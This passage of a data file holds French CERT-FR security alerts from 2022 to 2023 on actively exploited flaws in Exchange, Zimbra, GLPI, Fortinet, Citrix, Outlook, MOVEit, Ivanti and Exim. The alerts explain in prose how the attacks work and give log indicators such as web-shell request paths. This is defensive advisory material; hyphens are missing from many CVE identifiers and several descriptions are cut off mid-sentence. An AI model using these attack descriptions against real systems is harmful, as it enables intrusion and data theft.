1809 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 for 32-bit Systems | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) | Microsoft Windows – Windows 11 for x64-based Systems | Microsoft Windows – Windows 10 for x64-based Systems
+CERTFR-2022-ALE-008,[MaJ] Multiples vulnérabilités dans Microsoft Exchange,2023-03-14,CVE-2022-41040; CVE-2022-41082,Exécution de code arbitraire à distance,"\[Mise à jour du 09 novembre 2022\]
+L'éditeur a publié un correctif (cf. section solution).
+
+En date du 29 septembre 2022, Microsoft a indiqué l'existence de deux
+vulnérabilités, de type zérojour, au sein de Windows Exchange 2013,
+2016 et 2019.
+
+Ces vulnérabilités sont les suivantes :
+
+   CVE202241040 : Vulnérabilité de type injection de requêtes forgées
+    côté serveur (Server Side Request Forgery, SSRF) exploitable par
+    un attaquant authentifié ;
+   CVE202241082 : Vulnérabilité permettant à un attaquant authentifié
+    d'exécuter du code arbitraire à distance.
+
+Dans le cadre d'une attaque, la CVE202241040 peut permettre à un
+attaquant d'exploiter à distance la CVE202241082. Selon l'éditeur, ces
+deux vulnérabilités ne sont exploitables que si l'attaquant est déjà
+authentifié. Un correctif spécifique est en cours de développement
+par Microsoft.
+
+Ces vulnérabilités doivent faire l'objet d'une prise en compte
+immédiate, car elles ont été utilisées dans le cadre d'attaques ciblées.
+Le CERTFR n'a pour le moment pas connaissance des conditions ayant
+permis aux attaquants d'obtenir un accès authentifié sur les serveurs
+ciblés.
+
+Le CERTFR a connaissance de codes d'exploitation publics pour la
+CVE202241040.
+
+Le CERTFR a connaissance
+d'incidents en France impliquant l'exploitation de ces
+vulnérabilités.",2022-09-30T02:00:00.000000,Microsoft N/A – Microsoft Exchange Serveur 2013 toutes versions | Microsoft N/A – Microsoft Exchange Serveur 2016 toutes versions | Microsoft N/A – Microsoft Exchange Serveur 2019 toutes versions
+CERTFR-2022-ALE-009,[MaJ] Vulnérabilité dans Zimbra Collaboration,2023-03-14,CVE-2022-37393; CVE-2022-41352,Exécution de code arbitraire à distance,"\[MaJ 12 octobre 2022\] Un correctif est désormais disponible (cf.
+section Documentation).
+
+\[Publication initiale\]
+
+Le 15 septembre 2022, l'éditeur Zimbra a publié un avis de sécurité
+mentionnant une vulnérabilité dans l'implémentation de cpio par son
+moteur d'antivirus (Amavis). L'outil d'extraction d'archive cpio est
+utilisé par Zimbra dès lors que l'utilitaire pax n'est pas installé.
+Cette vulnérabilité permet à un attaquant non authentifié de téléverser
+ou écraser un fichier sur le serveur. Par ce biais, l'attaquant à la
+possibilité de déposer une porte dérobée afin de pouvoir exécuter du
+code arbitraire à distance sur la machine. En effet, si un attaquant
+envoie un courriel contenant une archive piégée avec le format .cpio,
+.rpm ou .tar à une instance de Zimbra ne disposant pas de l'utilitaire
+pax, alors, lors du processus d'extraction par Amavis la vulnérabilité
+sera déclenchée.
+
+Le 25 septembre, le NIST NVD attribue à cette vulnérabilité
+l'immatriculation CVE202241352. Cette vulnérabilité est simple à
+exploiter et pourrait être combinée avec une autre vulnérabilité de type
+élévation de privilèges, telle que la CVE202237393, pour prendre le
+contrôle total de la machine.
+
+Le CERTFR a connaissance de cas d'exploitation de cette vulnérabilité
+et de codes d'exploitation publiquement disponibles.",2022-10-07T02:00:00.000000,Synacor Zimbra Collaboration – Zimbra Collaboration Suite (ZCS) toutes versions utilisant cpio
+CERTFR-2022-ALE-010,Multiples vulnérabilités dans GLPI,2023-03-14,CVE-2022-35947; CVE-2022-35914,Contournement de la politique de sécurité; Exécution de code arbitraire à distance,"Le 14 septembre 2022, l'éditeur de GLPI (Gestionnaire Libre de Parc
+Informatique) a déclaré plusieurs vulnérabilités sur le produit, dont
+deux critiques. Elles permettent à un attaquant de provoquer une
+exécution de code arbitraire à distance et un contournement de la
+politique de sécurité.
+
+La vulnérabilité référencée par l'identifiant CVE202235914 affecte
+bibliothèque tierce  htmLawed  qui est embarquée par GLPI. Elle est
+due à la présence d’un fichier de test htmLawedTest.php et permet à un
+attaquant non authentifié d’exécuter du code arbitraire à distance.
+
+La seconde vulnérabilité immatriculée CVE202235947 permet à un
+attaquant de réaliser une injection SQL afin d'obtenir une connexion
+avec n’importe quel utilisateur ayant au préalable défini une clé API.
+
+Le CERTFR a publié un bulletin d'actualité le 20 septembre 2022 afin de
+signaler l'existence de ces vulnérabilités.
+
+Le CERTFR a connaissance de nombreux
+incidents liés à l'exploitation de la vulnérabilité immatriculée
+CVE202235914.
+
+ DÉTECTION
+
+Il est recommandé d'effectuer une vérification des journaux à la
+recherche de tentatives d'accès aux ressources suivantes :
+
+   /vendor/htmlawed/htmlawed/htmLawedTest.php
+   /vendor/htmlawed/htmlawed/404.php
+   /vendor/
+
+Par ailleurs, des requêtes vers les ressources suivantes peuvent être en
+lien avec l’attaque et doivent donc faire l'objet d'une attention
+particulière :
+
+   /redistest.php
+   /css/Arui.php
+   /css/legacy/Arui.php
+   /css/legacy/Arui1.php
+
+Si ces requêtes sont ",2022-10-07T02:00:00.000000,GLPI GLPI – GLPI versions 9.5.x antérieures à 9.5.9 | GLPI GLPI – GLPI versions 10.0.x versions antérieures à 10.0.3
+CERTFR-2022-ALE-011,Vulnérabilité dans les produits Fortinet,2023-07-26,CVE-2022-40684,Contournement de la politique de sécurité; Exécution de code arbitraire à distance,"Le 07 octobre 2022, des informations ont circulé concernant l’existence
+d’une vulnérabilité critique dans les produits Fortinet. Le 11 octobre
+2022, l’éditeur a publié un avis de sécurité détaillant l’existence
+d’une vulnérabilité permettant à un attaquant non authentifié de pouvoir
+réaliser des actions au travers de l’interface d’administration.
+
+L’éditeur indique que cette vulnérabilité a fait l’objet d’une attaque
+ciblée.
+
+Le 13 octobre 2022, des chercheurs ont publié un rapport détaillé ainsi
+qu'une preuve de concept. Depuis cette publication, le CERTFR constate
+que des variations de ce code d'exploitation sont publiquement
+disponibles.
+
+Le CERTFR anticipe des exploitations en masse de la
+vulnérabilité CVE202240684, d'autant plus que de nombreuses interfaces
+d’administration de produits Fortinet sont exposées sur Internet.
+
+L'exposition d'une interface de gestion sur Internet est contraire aux
+bonnes pratiques. Dans le cas où l’administration à distance est
+impératif, une première mesure temporaire peut consister à restreindre
+l'accès à des adresses ip de confiance. Il cependant conseillé de suivre
+les recommandations du guide publié par l'ANSSI pour la sécurisation de
+l'administration du SI \[1\].",2022-10-14T02:00:00.000000,Fortinet FortiProxy – FortiProxy versions 7.2.x antérieures à 7.2.1 | Fortinet FortiProxy – FortiProxy versions 7.0.x antérieures à 7.0.7 | Fortinet FortiSwitchManager – FortiSwitchManager versions 7.x antérieures à 7.2.1 | Fortinet FortiOS – FortiOS versions 7.2.x antérieures à 7.2.2 | Fortinet FortiOS – FortiOS versions 7.0.x antérieures à 7.0.7
+CERTFR-2022-ALE-012,[MàJ] Vulnérabilité dans FortiOS SSL-VPN,2023-07-26,CVE-2022-42475,Exécution de code arbitraire à distance,"Le 12 décembre 2022, l'éditeur Fortinet a publié un avis de sécurité
+mentionnant une vulnérabilité critique dans son produit FortiOS SSLVPN.
+Cette vulnérabilité de débordement de tas (heap overflow) permet à un
+attaquant distant non authentifié d'exécuter du code ou des commandes
+arbitraires via des requêtes spécifiquement conçues.
+
+Fortinet a connaissance d'un cas où cette vulnérabilité a été exploitée.
+Le CERTFR anticipe des exploitations en masse de la vulnérabilité
+CVE202242475, d'autant plus que de nombreuses interfaces
+d’administration de produits Fortinet sont exposées sur Internet.",2022-12-13T01:00:00.000000,Fortinet FortiOS – FortiOS versions 6.4.x antérieures à 6.4.11 | Fortinet FortiOS – FortiOS versions antérieures à 6.2.12 | Fortinet FortiOS – FortiOS versions 7.0.x antérieures à 7.0.9 | Fortinet FortiOS – FortiOS versions 7.2.x antérieures à 7.2.3 | Fortinet FortiOS – FortiOS-6K7K versions 7.0.x antérieures à 7.0.8 | Fortinet FortiOS – FortiOS-6K7K versions 6.4.x antérieures à 6.4.10 | Fortinet FortiOS – FortiOS-6K7K versions 6.2.x antérieures à 6.2.12 | Fortinet FortiOS – FortiOS-6K7K versions 6.0.x antérieures à 6.0.15
+CERTFR-2022-ALE-013,[MàJ] Vulnérabilité dans Citrix ADC et Gateway,2023-03-14,CVE-2022-27518,Exécution de code arbitraire à distance,"Le 13 décembre 2022, Citrix a indiqué avoir connaissance d'une
+vulnérabilité de type jourzéro (zeroday) affectant les produits
+Citrix ADC et Citrix Gateway. Cette vulnérabilité, immatriculée
+CVE202227518, permet à un attaquant à distance et non authentifié
+d'exécuter du code arbitraire sur l'équipement.
+
+L'exploitation de la vulnérabilité est uniquement possible si le produit
+Citrix est configuré en mode IdP SAML ou SP SAML. Il est possible de
+vérifier la configuration en inspectant le fichier ns.conf. Si les
+lignes add authentication samlAction ou
+add authentication samlIdPProfile sont présentes et que le produit est
+dans une version affectée, alors il doit être considéré comme
+vulnérable.
+
+L'éditeur a connaissance d'exploitation de cette vulnérabilité sur des
+équipements non mis à jour. Le CERTFR anticipe donc des exploitations
+en masse de la vulnérabilité CVE202227518.",2022-12-13T01:00:00.000000,
+CERTFR-2022-ALE-014,Multiples vulnérabilités dans AMI MegaRAC,2023-09-11,CVE-2022-40242; CVE-2022-40259; CVE-2022-2827,Exécution de code arbitraire à distance,"Contexte
+
+Le 05 décembre 2022, trois vulnérabilités respectivement identifiées par
+les numéros CVE202240259, CVE202240242 et CVE20222827 ont été
+signalées dans la solution d’administration à distance MegaRAC de
+l’éditeur AMI.
+
+La solution MegaRAC s’appuie sur un BMC (Baseboard Management
+Controller) : un microcontrôleur intégré à la carte mère d’un serveur
+(ou installé comme carte fille) qui possède son propre stockage, son
+propre système d’exploitation et peut disposer d’un port réseau dédié ou
+partagé avec le système principal. Ce microcontrôleur est utilisé afin
+de fournir des capacités de gestion à distance en mode ""hors bande"" et
+""hors tension"". Il permet aux administrateurs d’effectuer à distance un
+certain nombre de tâches qui nécessiteraient autrement un accès physique
+au serveur. Le processeur BMC dispose en effet d’accès aux différents
+composants de la carte mère, ce qui lui permet de surveiller le
+matériel, mettre à jour le micrologiciel du BIOS, mettre l'hôte sous
+tension, et permettre un déport clavierécransouris via le réseau.
+Souvent, il est connecté au bus PCIe et bénéficie d’un accès direct plus
+ou moins large à la mémoire en lecture et écriture (DMA, Direct Memory
+Access).
+
+Ce contrôleur peut être accédé par différentes interfaces :
+
+   IPMI (Intelligent Platform Management Interface) : il s’agit d’un
+    ensemble de spécifications d’interface permettant d’accéder aux
+    fonctions du BMC via le réseau IP ;
+   Redfish, successeur de IPMI, proposant une inter",2022-12-16T01:00:00.000000,N/A N/A – AMI MegaRAC SPx-13 versions 0 à SPx-13-update-4.00 | N/A N/A – AMI MegaRAC SPx-12 versions 0 à SPx-12-update-6.00
+CERTFR-2023-ALE-001,Vulnérabilité dans Fortinet FortiOS,2023-07-26,CVE-2022-41328,Contournement de la politique de sécurité; Exécution de code arbitraire à distance,"Le 07 mars 2023, Fortinet a publié un avis de sécurité détaillant
+l’existence d’une vulnérabilité de type traversée de chemin (path
+traversal) permettant à un attaquant authentifié avec un compte à
+privilèges de lire et d'écrire des fichiers arbitrairement au travers de
+l'interface en ligne de commande.
+
+Le 09 mars 2023, Fortinet a publié un billet sur son blog détaillant
+l'analyse de la compromission de plateformes de parefeux FortiGate avec
+le système FortiOS par l'exploitation de la vulnérabilité CVE202241328
+détaillé dans l'avis FGIR22369.
+
+Fortinet indique que cette vulnérabilité est activement exploitée dans
+le cadre d'attaques ciblées. C'est lors d'une réponse à incident
+impliquant des parefeux FortiGate gérés par une console FortiManager
+que les équipes de Fortinet ont pu identifier les informations
+cidessous :
+
+   Le vecteur de compromission initial semble provenir de la console
+    FortiManager, ceci est déduit par la temporalité et la ressemblance
+    des attaques simultanées sur différents parefeux gérés par la même
+    console ;
+   Le fichier /sbin/init est modifié et le fichier /bin/fgfm est
+    créé, notamment pour assurer la persistance et ajouter des
+    fonctionnalités de contrôle ;
+   Dans les cas connus de l'éditeur, les parefeux impactés ont été
+    brutalement arrêtés et leur redémarrage a été empêché par une
+    protection du système contre la modification du microgiciel (option
+    FIPS).
+
+Remarque : les moyens ayant permis la prise de contrôle de la c",2023-03-14T01:00:00.000000,Fortinet FortiOS – FortiOS versions 6.x antérieures à 6.4.12 | Fortinet FortiOS – FortiOS versions 7.2.x antérieures à 7.2.4 | Fortinet FortiOS – FortiOS versions 7.0.x antérieures à 7.0.10
+CERTFR-2023-ALE-002,[MàJ] Vulnérabilité dans Microsoft Outlook,2023-07-26,CVE-2023-23397; CVE-2023-29324,Élévation de privilèges,"\[mise à jour du 11 mai 2023\]
+Possibilité de contournement du correctif proposé par l'éditeur par le
+biais de la CVE202329324
+
+\[mise à jour du 20 avril 2023\] clarification de la recommandation
+pour le filtrage du flux SMB
+
+\[mise à jour du 29 mars 2023\] complément d'information et
+recommandation  
+
+
+En date du 14 mars 2023, lors
+de sa mise à jour mensuelle, Microsoft a indiqué l'existence
+d'une vulnérabilité CVE202323397 affectant diverses versions du
+produit Outlook pour Windows qui permet à un attaquant de récupérer le condensat
+NetNTLMv2 (new technology LAN manager).
+
+Microsoft indique que cette vulnérabilité est activement exploitée dans
+le cadre d'attaques ciblées. Par ailleurs, le CERTFR a connaissance
+d'une première preuve de concept publique (non encore qualifiée).
+
+La vulnérabilité ne requiert pas d'intervention de l'utilisateur. Elle
+est déclenchée lorsqu'un attaquant envoie un message contenant un
+lien UNC (Universal Naming Convention) vers une ressource partagée
+en SMB hébergée sur un serveur qui serait sous contrôle de
+l'attaquant. Durant la connexion SMB au serveur malveillant, le message d’authentification
+NTLM pour la négociation de l'authentification est envoyé, l'attaquant
+peut ainsi le relayer auprès d'autres services supportant ce type
+d'authentification pour obtenir un accès valide.
+
+L'éditeur indique que les version d'Outlook pour Android, iOS, Mac, mais
+aussi la version web et les services M365 ne sont pas vulnérables.
+
+Microsoft a publié un code Po",2023-03-15T01:00:00.000000,Microsoft Office – Microsoft Office LTSC 2021 pour éditions 32 bits | Microsoft Office – Microsoft Office 2019 pour éditions 32 bits | Microsoft Office – Microsoft Office 2019 pour éditions 64 bits | Microsoft Office – Microsoft Office LTSC 2021 pour éditions 64 bits | Microsoft N/A – Microsoft 365 Apps pour Entreprise pour systèmes 32 bits | Microsoft N/A – Microsoft 365 Apps pour Entreprise pour systèmes 64 bits | Microsoft N/A – Microsoft Outlook 2013 RT Service Pack 1 | Microsoft N/A – Microsoft Outlook 2013 Service Pack 1 (éditions 64 bits) | Microsoft N/A – Microsoft Outlook 2013 Service Pack 1 (éditions 32 bits) | Microsoft N/A – Microsoft Outlook 2016 (édition 64 bits) | Microsoft N/A – Microsoft Outlook 2016 (édition 32 bits)
+CERTFR-2023-ALE-003,[MàJ] Compromission de l'application 3CX Desktop App,2023-04-12,Aucune,Déploiement d'une charge utile malveillante sur le système,"Le 30 mars 2023, l'éditeur a publié un communiqué concernant la
+compromission de leur application de bureau 3CX (3CX Desktop App).
+Cette application de conférence vocale et vidéo, dans certaines
+versions, est infectée par un cheval de Troie qui rend possible le
+déploiement d'une charge utile à des fins malveillantes.
+
+Le CERTFR ne peut pas confirmer, à ce stade, si d'autres versions que
+celles mentionnées dans la section Systèmes affectés sont compromises.
+Il est donc très fortement recommandé, quelle que soit la version, de
+désinstaller l'application de bureau 3CX et de suivre la recommandation
+de l'éditeur consistant à utiliser l'application web PWA. L'éditeur
+propose un manuel d'utilisation qui peut simplifier cette transition
+\[1\].
+
+Par ailleurs, il est aussi indispensable de procéder à une
+vérification des postes qui disposaient de cette application afin de
+s'assurer qu'ils n'ont pas été compromis. Pour cela, plusieurs rapports
+en source ouverte proposent des marqueurs de compromission à vérifier
+\[2\]\[3\]. En cas de suspicion de compromission, il est recommandé de
+continuer les investigations (cf. bons réflexes en cas d'intrusion sur
+votre système d'information \[4\]).",2023-03-31T02:00:00.000000,"Apple MacOS – Application de bureau 3CX (application Electron pour macOS) versions 18.11.1213, 18.12.402, 18.12.407 et 18.12.416 | Microsoft Windows – Application de bureau 3CX (application Electron pour Windows) versions 18.12.407 et 18.12.416"
+CERTFR-2023-ALE-004,Vulnérabilité dans les produits Fortinet,2023-09-11,CVE-2023-27997,Exécution de code arbitraire à distance,"Le 12 juin 2023, Fortinet a publié un avis de sécurité concernant la
+vulnérabilité CVE202327997. Celleci permet à un attaquant non
+authentifié d'exécuter du code arbitraire à distance sur des produits
+Fortinet qui proposent une fonctionnalité de VPN SSL.
+
+Dans une communication supplémentaire (cf. section Documentation),
+Fortinet indique que cette vulnérabilité n'est exploitable que si la
+fonctionnalité VPN SSL est activée. De plus, celleci serait
+activement exploitée dans le cadre d'attaques ciblées.
+
+Le CERTFR a connaissance d'une preuve de concept disponible
+publiquement. En l'état, le code permet uniquement un déni de service à
+distance. Le CERTFR recommande donc d'appliquer le correctif,
+disponible depuis le 9 juin 2023, dans les meilleurs délais.
+
+La communication supplémentaire \[1\] de Fortinet contient également des
+recommandations utiles concernant la recherche de marqueurs de
+compromission, le durcissement de l'équipement ainsi que le rappel de
+bonnes pratiques de sécurité.",2023-06-13T02:00:00.000000,Fortinet FortiProxy – FortiProxy versions antérieures à 7.0.10 | Fortinet FortiOS – FortiOS versions 6.0.x antérieures à 6.0.17 | Fortinet FortiOS – FortiOS versions 6.2.x antérieures à 6.2.14 | Fortinet FortiOS – FortiOS-6K7K versions 6.4.x antérieures à 6.4.13 | Fortinet FortiOS – FortiOS-6K7K versions 6.0.x antérieures à 6.0.17 | Fortinet FortiOS – FortiOS versions 7.2.x antérieures à 7.2.5 | Fortinet FortiOS – FortiOS-6K7K versions 7.0.x antérieures à 7.0.12 | Fortinet FortiOS – FortiOS versions 7.0.x antérieures à 7.0.12 | Fortinet FortiOS – FortiOS-6K7K versions 6.2.x antérieures à 6.2.15 | Fortinet FortiOS – FortiOS versions 6.4.x antérieures à 6.4.13 | Fortinet FortiProxy – FortiProxy versions 7.2.x antérieures à 7.2.4
+CERTFR-2023-ALE-005,Synthèse sur l'exploitation d'une vulnérabilité dans MOVEit Transfer,2023-09-11,CVE-2023-34362; CVE-2023-35036; CVE-2023-35708,Exécution de code arbitraire à distance,"La découverte d'une vulnérabilité affectant le logiciel MOVEit Transfer
+de Progress Software, le 31 mai 2023, avait conduit le CERTFR à publier
+des éléments d'information dans le bulletin d'actualité
+CERTFR2023ACT025.
+
+L'objet de cette alerte CERTFR2023ALE005 est de faire le point sur
+l'exploitation de cette vulnérabilité par le groupe cybercriminel CL0P
+ainsi que de synthétiser les mesures de remédiation et de correction à
+appliquer par les utilisateurs du logiciel MOVEit Transfer.
+
+Télécharger le rapport : Exploitation
+d'une vulnérabilité dans MOVEit Transfer par le groupe cybercriminel
+CL0P",2023-07-05T02:00:00.000000,Progress MOVEit Transfer – MOVEit Transfer versions 2021.0.x antérieures à 2021.0.8 (13.0.8) | Progress MOVEit Transfer – MOVEit Transfer versions 2021.1.x antérieures à 2021.1.6 (13.1.6) | Progress MOVEit Transfer – MOVEit Transfer versions antérieures à 2020.1.10 (12.1.10) | Progress MOVEit Transfer – MOVEit Transfer versions 2022.1.x antérieures à 2022.1.7 (14.1.7) | Progress MOVEit Transfer – MOVEit Transfer versions 2023.x antérieures à 2023.0.3 (15.0.3) | Progress MOVEit Transfer – MOVEit Cloud versions antérieures à 15.0.2.39 (test) | Progress MOVEit Transfer – MOVEit Transfer versions 2022.0.x antérieures à 2022.0.6 (14.0.6) | Progress MOVEit Transfer – MOVEit Cloud versions antérieures à 14.4.6.97 ou 14.0.5.45 (production)
+CERTFR-2023-ALE-006,Vulnérabilité dans les produits Microsoft,2023-12-12,CVE-2023-36884,Exécution de code arbitraire à distance,"Description de la vulnérabilité
+
+Dans le cadre de son Patch Tuesday, en date du 11 juillet 2023,
+Microsoft a indiqué l'existence d'une vulnérabilité référencée
+CVE202336884 \[1\] au sein de plusieurs versions de Windows et
+produits Office. Un score CVSSv3 de 8.3 lui a été attribué.
+
+L'éditeur confirme qu'elle est activement exploitée de façon ciblée
+\[2\].
+
+La vulnérabilité CVE202336884 permet à un attaquant d'exécuter du code
+arbitraire à distance dans le contexte utilisateur à l'aide d'un
+document Microsoft Office spécialement conçu, préalablement transmis à
+l'aide de technique d'ingénierie sociale.
+
+Le CERTFR recommande fortement de mettre en œuvre les moyens
+d'atténuation proposés par l'éditeur en attendant la publication d'un
+correctif.
+
+Cette alerte sera mise à jour de façon régulière au gré des nouveaux
+éléments qui nous seront communiqués.
+
+ 
+
+ Campagne d'exploitation
+
+La CVE202336884 aurait été exploitée, d’après Microsoft \[4\], par le
+mode opératoire Storm0978 lors d’une campagne en juin 2023 contre des
+entités gouvernementales et du secteur de la défense européennes et
+nordaméricaines à des fins d’espionnage. Le code malveillant utilisé
+par les attaquants suite à l’exploitation de cette vulnérabilité,
+présenterait des similarités avec la porte dérobée RomCom.
+
+RomCom est un code malveillant découvert en août 2022 par PaloAlto
+\[5\], qui aurait été utilisé depuis octobre 2022 dans des campagnes
+d’espionnage contre des entités gouvernementales et militaires
+ukrainie",2023-12-12T01:00:00.000000,Microsoft Office – Microsoft Office LTSC 2021 pour éditions 32 bits | Microsoft Office – Microsoft Office 2019 pour éditions 32 bits | Microsoft Office – Microsoft Office 2019 pour éditions 64 bits | Microsoft Office – Microsoft Office LTSC 2021 pour éditions 64 bits | Microsoft N/A – Microsoft Word 2016 (édition 64 bits) | Microsoft N/A – Microsoft Word 2013 Service Pack 1 (éditions 64 bits) | Microsoft N/A – Microsoft Word 2013 Service Pack 1 (éditions 32 bits) | Microsoft N/A – Microsoft Word 2016 (édition 32 bits) | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 | Microsoft Windows – Windows 10 Version 21H2 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1809 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 22H2 pour systèmes ARM64 | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 | Microsoft Windows – Windows 10 Version 22H2 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1607 pour systèmes x64 | Microsoft Windows – Windows 11 version 21H2 pour systèmes x64 | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows Server 2022 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 (Server Core installation) | Microsoft Windows – Windows 10 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 1809 pour systèmes ARM64 | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H2 pour systèmes ARM64 | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows 10 Version 21H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 pour systèmes x64 | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows 10 Version 22H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows 10 Version 1809 pour systèmes x64 | Microsoft Windows – Windows Server 2022 | Microsoft Windows – Windows 11 Version 22H2 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1607 pour systèmes 32 bits | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows 11 version 21H2 pour systèmes ARM64 | Microsoft Windows – Windows 11 Version 22H2 pour systèmes ARM64
+CERTFR-2023-ALE-007,[MàJ] Vulnérabilité dans Zimbra Collaboration Suite,2024-01-02,CVE-2023-37580,Atteinte à la confidentialité des données; Atteinte à l'intégrité des données,"\[Mise à jour du 26 juillet 2023\]
+Publication du correctif de sécurité par l'éditeur  
+
+
+Le 26 juillet 2023, l'éditeur a publié un
+correctif de sécurité \[1\] pour cette vulnérabilité immatriculée
+CVE202337580. Il est donc fortement recommandé de déployer le
+correctif P41 pour toutes les versions 8.8.15 du produit Zimbra
+Collaboration Suite.
+
+Le 13 juillet 2023, Zimbra a publié un avis de sécurité alertant de
+l'existence d'une vulnérabilité affectant sa solution Collaboration
+Suite dans la version 8.8.15
+
+Cette vulnérabilité permet à un attaquant de réaliser une injection de
+code indirecte (XSS) pour porter atteinte à l'intégrité des données et
+la confidentialité des données. Aucun identifiant CVE ne lui a été
+attribué au moment de la publication de la présente alerte.
+
+Le CERTFR rappelle que les
+versions 8.x antérieures à 8.8.15 ne sont plus supportées. \[Mise
+à jour du 18 juillet 2023\] L'éditeur confirme que toutes les versions
+8.x sont affectées.
+
+L'éditeur indique que cette
+vulnérabilité est activement exploitée alors qu'une version
+corrective n'est pas disponible.",2023-07-17T02:00:00.000000,Synacor Zimbra Collaboration – Zimbra Collaboration Suite 8.x
+CERTFR-2023-ALE-008,[MàJ] Vulnérabilité dans Citrix NetScaler ADC et NetScaler Gateway,2024-01-02,CVE-2023-3519,Exécution de code arbitraire à distance,"Le 18 juillet 2023, Citrix a publié un avis de sécurité concernant
+plusieurs vulnérabilités. La plus critique, dont l'identifiant CVE est
+CVE20233519, permet à un attaquant non authentifié d'exécuter du code
+arbitraire à distance.
+
+L'équipement est vulnérable s'il est configuré en tant que passerelle
+(Gateway : VPN virtual server, ICA Proxy, CVPN, RDP Proxy) ou en tant
+que serveur virtuel AAA (AAA virtual server).
+
+L'éditeur indique que les produits NetScaler ADC et NetScaler Gateway en
+version 12.1 sont en fin de vie. Les clients sont invités à migrer vers
+une version supportée et à jour des correctifs de sécurité.
+
+Citrix indique que cette vulnérabilité est activement exploitée. Le
+CERTFR recommande donc fortement d'appliquer le correctif dans les plus
+brefs délais.
+
+ Détection d'une compromission
+
+\[mise à jour du 20 juillet
+2023\] La CISA a documenté une méthode de recherche des signes
+d'une compromission de l'équipement \[2\].",2023-07-19T02:00:00.000000,Citrix NetScaler ADC – NetScaler ADC 13.1-FIPS antérieures à 13.1-37.159 | Citrix N/A – NetScaler ADC et NetScaler Gateway versions 13.1-x antérieures à 13.1-49.13 | Citrix NetScaler ADC – NetScaler ADC 12.1-FIPS antérieures à 12.1-55.297 | Citrix N/A – NetScaler ADC et NetScaler Gateway versions 13.0-x antérieures à 13.0-91.13 | Citrix NetScaler ADC – NetScaler ADC 12.1-NDcPP antérieures à 12.1-55.297
+CERTFR-2023-ALE-009,[MàJ] Multiples vulnérabilités dans Ivanti Endpoint Manager Mobile,2023-09-15,CVE-2023-35081; CVE-2023-35082; CVE-2023-35078,Exécution de code arbitraire à distance; Atteinte à la confidentialité des données; Atteinte à l'intégrité des données; Contournement de la politique de sécurité,"\[Mise à jour
+du 15 septembre 2023\] Correction de la vulnérabilité
+CVE202335082
+
+Le 21 août 2023, l'éditeur a publié une mise à jour du bulletin
+complémentaire de sécurité \[3\] pour annoncer la disponibilité d'un
+correctif concernant la vulnérabilité CVE202335082. Ce correctif est
+inclus dans la version 11.11.0.0 d'Ivanti EPMM \[5\].
+
+\[Mise à jour
+du 11 août 2023\] Avis Ivanti concernant la vulnérabilité
+CVE202335082
+
+Le 07 août 2023, Ivanti a publié un nouvel avis de sécurité \[3\]
+indiquant que la vulnérabilité CVE202335082 affecte toutes les
+versions de Endpoint Manager Mobile, et non pas uniquement les versions
+antérieures à 11.3 comme indiqué dans l'avis du 02 août 2023 \[4\].
+
+Cette vulnérabilité permet à un attaquant d'obtenir un accès non
+authentifié à des chemins d'API spécifiques afin de récupérer des
+informations personnellement identifiables (PII) d'utilisateurs.
+
+Dans l’attente de la publication de la version 11.11, Ivanti fournit un
+script RPM corrigeant cette vulnérabilité pour les versions 11.8.1.2,
+11.9.1.2 et 11.10.0.3. Si l’équipement est dans une version antérieure,
+il est conseillé de le mettre à jour vers l’une de ces trois versions,
+puis d’exécuter le script. Cette procédure est décrite dans l’avis.
+
+L'éditeur annonce que :
+
+   La vulnérabilité CVE202335082 est exploitable uniquement sur HTTP
+    mais pas HTTPS ;
+   Une preuve de concept est disponible publiquement ;
+   La vulnérabilité CVE202335082 est activement exploitée.
+
+\[Mise à jour du 02 août",2023-07-26T02:00:00.000000,
+CERTFR-2023-ALE-010,Multiples vulnérabilités dans Exim,2024-02-16,CVE-2023-42118; CVE-2023-42116; CVE-2023-42115; CVE-2023-42117; CVE-2023-42119; CVE-2023-42114,Exécution de code arbitraire à distance; Atteinte à la confidentialité des données; Atteinte à l'intégrité des données; Contournement de la politique de sécurité,"Le 27 septembre 2023, Zero Day Initiative (ZDI) a publié six avis de
+sécurité \[1\] concernant des vulnérabilités de type zérojour affectant
+les versions antérieures à 4.96.1 ou 4.97 de l'agent de transfert de
+courriels (Mail Transfer Agent ou MTA) Exim. Le 1er octobre 2023,
+l'éditeur a publié un avis de sécurité \[2\] contenant les détails des
+six vulnérabilités découvertes par ZDI.
+
+L'éditeur annonce dans son bulletin du 1er octobre 2023 la
+correction, dans les versions 4.96.1 et 4.97 d'Exim, de trois
+vulnérabilités affectant la gestion de l'authentification :
+
+   Les vulnérabilités identifiées CVE202342114 et CVE202342116
+    ayant respectivement un score CVSSv3 de 3.7 et 8.1 sont présentes
+    dans le soussystème SPA/NTLM. Ce dernier introduit une faiblesse
+    dans la validation des entrées utilisateurs lors du traitement des
+    demandes de défis (challenges) NTLM. Un attaquant distant est en
+    mesure de provoquer une atteinte à la confidentialité des données et
+    une exécution de code arbitraire ;
+   La vulnérabilité CVE202342115, avec un score CVSSv3 de 9.8, est
+    liée à l'implémentation du mécanisme EXTERNAL de la couche
+    d'authentification et de sécurité simple (Simple Authentication and
+    Security Layer ou SASL). Un manque de validation des données
